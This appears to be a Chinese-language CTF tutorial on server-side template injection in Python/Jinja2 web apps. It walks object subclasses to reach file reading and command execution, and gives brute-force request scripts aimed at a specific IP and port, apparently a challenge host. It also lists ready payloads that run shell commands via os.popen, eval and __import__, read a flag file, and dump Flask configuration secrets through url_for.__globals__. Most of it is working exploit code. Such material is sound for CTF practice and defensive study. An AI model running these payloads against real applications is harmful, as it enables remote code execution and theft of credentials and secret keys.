**基础知识**

```python
[].__class__         获取[] 对应的类

[].__class__.__base__           获取[]对应的类的基类

[].__class__.base__.__subclasses__()     获取[]对应的类的基类的所有子类

[].__class__.base__.__subclasses__()[30]('flag').read()  （假设<type file> file方法是第30，使用read()方法来读取flag文件）

[].__class__.base__.__subclasses__()[50].__init__.__globals__['os'].system('ls')  (假设os类是第50个，初始化它并使用system函数来执行ls命令)
```

**SSTI读取文件**

python2中可以使用file类来读取文件:

`{{[].__class__.__base__.__subclasses__()[40]('flag').read()}}`

python3中没有file类了，可以使用<class '_frozen_importlib_external.FileLoader'>,<class ‘click.utils.LazyFile’><class ‘codecs.IncrementalEncoder’>来读取文件

```python
import requests
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52'}
for i in range(500):
    url = "http://61.147.171.105:63900/{{().__class__.__base__.__subclasses__()["+str(i)+"]}}"
    res = requests.get(url=url, headers=headers)
    if 'click.utils.LazyFile' in res.text:
       print(i)
 
 
 
payload:{{[].__class__.__base__.__subclasses__()[257]('flag').read()}}
```

**SSTI执行命令**

可以用来执行命令的类有很多，其基本原理就是遍历含有eval函数即os模块的子类，利用这些子类中的eval函数即os模块执行命令。

**通过内建函数eval执行命令**

```python
import requests
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52'}
for i in range(500):
    url = "http://61.147.171.105:63900/{{().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__['__builtins__']}}"
    res = requests.get(url=url, headers=headers)
    if 'eval' in res.text:
       print(i)
 
payload:{{[].__class__.__base__.__subclasses__()[58].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls").read()')}}
 
```

**寻找os模块执行命令**

Python的 os 模块中有system和popen这两个函数可用来执行命令。其中system()函数执行命令是没有回显的，我们可以使用system()函数配合curl外带数据；popen()函数执行命令有回显。所以比较常用的函数为popen()函数，而当popen()函数被过滤掉时，可以使用system()函数代替

```python
import requests
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52'}
for i in range(500):
    url = "http://61.147.171.105:63900/{{().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__}}"
    res = requests.get(url=url, headers=headers)
    if 'os.py' in res.text:
       print(i)
 
 
payload:{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}
```

**寻找importlib类执行命令**

Python 中存在 <class '_frozen_importlib.BuiltinImporter'> 类，目的就是提供 Python 中 import 语句的实现（以及 __import__ 函数）。我么可以直接利用该类中的load_module将os模块导入，从而使用 os 模块执行命令。

也可以搜索__import__函数来导入os模块

```python
import requests
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52'}
for i in range(500):
    url = "http://61.147.171.105:63900/{{().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__}}"
    res = requests.get(url=url, headers=headers)
    if '__import__' in res.text:
       print(i)
 
 
payload:{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read()}}
```

**寻找linecache类执行命令**

inecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块，所以我们也可以利用这个 linecache 函数去执行命令。

```python
import requests
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52'}
for i in range(500):
    url = "http://61.147.171.105:63900/{{().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__}}"
    res = requests.get(url=url, headers=headers)
    if 'linecache' in res.text:
       print(i)
 
payload={{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache']['os'].popen('ls').read()}}
```

**config_app**

其中包含应用程序的所有配置值.在大多数情况下，这包括敏感值，例如数据库连接字符串，第三方服务的凭证，SECRET_KEY等。

例如：

url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config等

如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）

```python
{{url_for.__globals__['current_app'].config.FLAG}}
{{get_flashed_messages.__globals__['current_app'].config.FLAG}}
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}
 
```

